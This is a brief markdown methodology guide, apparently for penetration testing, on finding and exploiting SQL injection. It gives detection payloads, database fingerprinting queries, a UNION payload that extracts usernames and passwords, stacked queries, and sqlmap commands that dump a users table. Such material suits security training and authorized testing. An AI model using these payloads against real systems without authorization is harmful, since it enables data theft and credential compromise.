# Exploiting SQL Injection Vulnerabilities

## Workflow

### Step 1: Injection Point Discovery
- **Map all input vectors**: URLs, POST bodies, headers.
- **Error-based detection**: Inject single quote (`'`) and observe response.
- **Boolean-based detection**: `' AND 1=1--` vs `' AND 1=2--`.
- **Time-based detection**: `' AND SLEEP(5)--`.

### Step 2: Database Fingerprinting
- **MySQL**: `VERSION()`, `@@version`.
- **PostgreSQL**: `version()`.
- **MSSQL**: `@@version`.

### Step 3: Manual Exploitation
- **UNION-based**: `' UNION SELECT NULL,username,password FROM users--`.
- **Blind boolean**: Character-by-character extraction using `SUBSTRING`.
- **Stacked queries**: `; INSERT INTO ...`.

### Step 4: Automated with sqlmap
- `sqlmap -u "URL" --batch --dbs`
- `sqlmap -u "URL" -D db -T users --dump`
